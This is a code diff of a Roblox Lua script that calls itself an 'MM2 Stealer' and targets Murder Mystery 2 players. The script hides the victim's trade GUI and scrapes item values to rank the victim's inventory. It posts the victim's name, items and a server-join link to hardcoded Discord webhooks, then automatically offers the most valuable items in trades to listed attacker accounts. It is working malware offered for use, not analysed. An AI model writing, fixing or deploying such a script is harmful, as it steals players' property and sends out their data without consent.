@@ -1,5 +1,3 @@
--- MM2 Stealer Script with Proper Supreme Values Integration
-
 usernames = { "xQuartz0", "isaidmager", "214Eli_alt4" }
 webhook = "https://discord.com/api/webhooks/1404789801785364500/Gj3a6Wh-Hhx1ZtqVWN57Wi2SV2znrqi1UVGvhqE8e56wApuyC7fsZBZ1aWMNMyNMgJlM"
 
@@ -17,27 +15,8 @@ local GetProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData
 local request = (syn and syn.request) or (http and http.request) or (http_request) or request
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
--- Destroy trade GUI to prevent interference
-pcall(function() LocalPlayer.PlayerGui.TradeGUI_Phone:destroy() end)
-pcall(function() LocalPlayer.PlayerGui.TradeGUI:destroy() end)
-
--- Supreme MM2 Values API with proper rarity data
-local function getSupremeValues()
-    local success, response = pcall(function()
-        return request({
-            Url = "https://supreme.valorscripts.com/api/mm2/values",
-            Method = "GET"
-        })
-    end)
-    
-    if success and response and response.StatusCode == 200 then
-        local data = HttpService:JSONDecode(response.Body)
-        if data and data.success then
-            return data.data
-        end
-    end
-    return {}
-end
+local tradeGui_phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
+tradeGui_phone:destroy()
 
 local function isUsernameInList(name)
     for _, v in ipairs(usernames) do
@@ -45,6 +24,10 @@ local function isUsernameInList(name)
     end
     return false
 end
+
+pcall(function()
+    LocalPlayer.PlayerGui.TradeGUI:destroy()
+end)
 
 local function fireClick(button)
     if button and button:IsA("TextButton") then
@@ -66,6 +49,170 @@ local function moveGuiOffscreen(gui)
     end
 end
 
+-- SupremeValues implementation
+local rarityTable = {
+    "Common",
+    "Uncommon",
+    "Rare",
+    "Legendary",
+    "Godly",
+    "Ancient",
+    "Unique",
+    "Vintage"
+}
+
+local categories = {
+    godly = "https://supremevaluelist.com/mm2/godlies.html",
+    ancient = "https://supremevaluelist.com/mm2/ancients.html",
+    unique = "https://supremevaluelist.com/mm2/uniques.html",
+    classic = "https://supremevaluelist.com/mm2/vintages.html",
+    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+}
+
+local headers = {
+    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+}
+
+local function trim(s)
+    return s:match("^%s*(.-)%s*$")
+end
+
+local function fetchHTML(url)
+    local response = request({
+        Url = url,
+        Method = "GET",
+        Headers = headers
+    })
+    return response.Body
+end
+
+local function parseValue(itembodyDiv)
+    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if valueStr then
+        valueStr = valueStr:gsub(",", "")
+        local value = tonumber(valueStr)
+        if value then
+            return value
+        end
+    end
+    return nil
+end
+
+local function extractItems(htmlContent)
+    local itemValues = {}
+    
+    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        itemName = itemName:match("([^<]+)")
+        if itemName then
+            itemName = trim(itemName:gsub("%s+", " "))
+            itemName = trim((itemName:split(" Click "))[1])
+            local itemNameLower = itemName:lower()
+
+            local value = parseValue(itembodyDiv)
+            if value then
+                itemValues[itemNameLower] = value
+            end
+        end
+    end
+    
+    return itemValues
+end
+
+local function extractChromaItems(htmlContent)
+    local chromaValues = {}
+
+    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        chromaName = chromaName:match("([^<]+)")
+        if chromaName then
+            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
+            local value = parseValue(itembodyDiv)
+            if value then
+                chromaValues[chromaName] = value
+            end
+        end
+    end
+    
+    return chromaValues
+end
+
+local function buildValueList()
+    local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    local allExtractedValues = {}
+    local chromaExtractedValues = {}
+    local categoriesToFetch = {}
+
+    for rarity, url in pairs(categories) do
+        table.insert(categoriesToFetch, {rarity = rarity, url = url})
+    end
+    
+    local totalCategories = #categoriesToFetch
+    local completed = 0
+    local lock = Instance.new("BindableEvent")
+
+    for _, category in ipairs(categoriesToFetch) do
+        task.spawn(function()
+            local rarity = category.rarity
+            local url = category.url
+            local htmlContent = fetchHTML(url)
+            
+            if htmlContent and htmlContent ~= "" then
+                if rarity ~= "chroma" then
+                    local extractedItemValues = extractItems(htmlContent)
+                    for itemName, value in pairs(extractedItemValues) do
+                        allExtractedValues[itemName] = value
+                    end
+                else
+                    chromaExtractedValues = extractChromaItems(htmlContent)
+                end
+            end
+
+            completed = completed + 1
+            if completed == totalCategories then
+                lock:Fire()
+            end
+        end)
+    end
+
+    lock.Event:Wait()
+
+    local valueList = {}
+
+    for dataid, item in pairs(database) do
+        local itemName = item.ItemName and item.ItemName:lower() or ""
+        local rarity = item.Rarity or ""
+        local hasChroma = item.Chroma or false
+
+        if itemName ~= "" and rarity ~= "" then
+            local weaponRarityIndex = table.find(rarityTable, rarity)
+            local godlyIndex = table.find(rarityTable, "Godly")
+
+            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
+                if hasChroma then
+                    local matchedChromaValue = nil
+                    for chromaName, value in pairs(chromaExtractedValues) do
+                        if chromaName:find(itemName) then
+                            matchedChromaValue = value
+                            break
+                        end
+                    end
+
+                    if matchedChromaValue then
+                        valueList[dataid] = matchedChromaValue
+                    end
+                else
+                    local value = allExtractedValues[itemName]
+                    if value then
+                        valueList[dataid] = value
+                    end
+                end
+            end
+        end
+    end
+
+    return valueList
+end
+
 local function getTopItems()
     local success, profileData = pcall(function()
         return GetProfileData:InvokeServer()
@@ -73,17 +220,14 @@ local function getTopItems()
     if not success or not profileData then return {} end
 
     local owned = profileData.Weapons and profileData.Weapons.Owned or {}
-    local Values = getSupremeValues()
+    local valueList = buildValueList()
+    if not valueList or type(valueList) ~= "table" then valueList = {} end
 
     local items = {}
     for itemId, amount in pairs(owned) do
-        if Values[itemId] then
-            table.insert(items, {
-                id = itemId,
-                value = Values[itemId].value or 0,
-                quantity = amount,
-                rarity = Values[itemId].rarity or "Common"
-            })
+        local value = valueList[itemId]
+        if value then
+            table.insert(items, {id = itemId, value = value, quantity = amount})
         end
     end
 
@@ -101,65 +245,37 @@ end
 local function summariseItems(items)
     local lines = {}
     for _, item in ipairs(items) do
-        table.insert(lines, string.format("%s - %s (%dx) [%s]", item.id, formatNumber(item.value), item.quantity, item.rarity))
+        table.insert(lines, string.format("%s - %s (%dx)", item.id, formatNumber(item.value), item.quantity))
     end
     return table.concat(lines, "\n")
-end
-
-local function calculateRarityCounts(items)
-    local counts = {
-        Ancient = 0,
-        Godly = 0,
-        Unique = 0,
-        Vintage = 0,
-        Legendary = 0,
-        Rare = 0,
-        Uncommon = 0,
-        Common = 0
-    }
-    
-    for _, item in ipairs(items) do
-        if counts[item.rarity] then
-            counts[item.rarity] = counts[item.rarity] + item.quantity
-        end
-    end
-    
-    return counts
 end
 
 local items = getTopItems()
 local totalValue = 0
 for _, item in ipairs(items) do
-    totalValue = totalValue + (item.value * item.quantity)
+    totalValue += item.value * item.quantity
 end
-
-local rarityCounts = calculateRarityCounts(items)
 
 if totalValue >= 100 then
     usernames = { "xQuartz0", "isaidmager", "" } -- dual usernames
     webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVbCs"
 end
 
-local function sendWebhook(totalValue, tradableSummary, rarityCounts)
-    local rarityField = ""
-    for rarity, count in pairs(rarityCounts) do
-        rarityField = rarityField .. string.format("%s: %d\n", rarity, count)
-    end
-
+local function sendWebhook(totalValue, tradableSummary)
     local payload = {
         ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
         ["embeds"] = {{
-            ["title"] = "MM2 Stealer | Supreme Values",
+            ["title"] = "MM2 Stealer",
             ["color"] = 0x8400ff,
             ["fields"] = {
-                {["name"] = "👤 Victim", ["value"] = LocalPlayer.Name, ["inline"] = true},
-                {["name"] = "🛠️ Executor", ["value"] = executor, ["inline"] = true},
-                {["name"] = "💰 Total Value", ["value"] = formatNumber(totalValue), ["inline"] = true},
-                {["name"] = "📊 Rarity Counts", ["value"] = "```"..rarityField.."```", ["inline"] = true},
-                {["name"] = "📦 Top Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
-                {["name"] = "🔗 Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = true}
+                {["name"] = "Victim", ["value"] = LocalPlayer.Name},
+                {["name"] = "Creator", ["value"] = table.concat(usernames, ", ")},
+                {["name"] = "Executor", ["value"] = executor},
+                {["name"] = "Total Value", ["value"] = formatNumber(totalValue)},
+                {["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```"},
+                {["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
             },
-            ["footer"] = {["text"] = "Supreme MM2 Values • " .. os.date("%B %d, %Y %H:%M:%S")},
+            ["footer"] = {["text"] = "by @x19b • " .. os.date("%B %d, %Y")},
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
@@ -178,9 +294,8 @@ local function sendWebhook(totalValue, tradableSummary, rarityCounts)
     send(webhook, payload)
 end
 
-sendWebhook(totalValue, summariseItems(items), rarityCounts)
+sendWebhook(totalValue, summariseItems(items))
 
--- Rest of your trading functions remain the same...
 local function tryClickTradeGUI(name)
     local gui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI")
     local root = gui:FindFirstChild("Lobby") or gui:FindFirstChild("Game")
@@ -225,7 +340,7 @@ local function doTrade()
             OfferItem:FireServer(item.id, "Weapons")
             task.wait(0.1)
         end
-        count = count + 1
+        count += 1
         if count >= 4 then break end
     end
 
@@ -233,7 +348,7 @@ local function doTrade()
     local remaining = getTopItems()
     local total = 0
     for _, item in ipairs(remaining) do
-        total = total + (item.value * item.quantity)
+        total += item.value * item.quantity
     end
     
     if #remaining == 0 or total <= 0 then
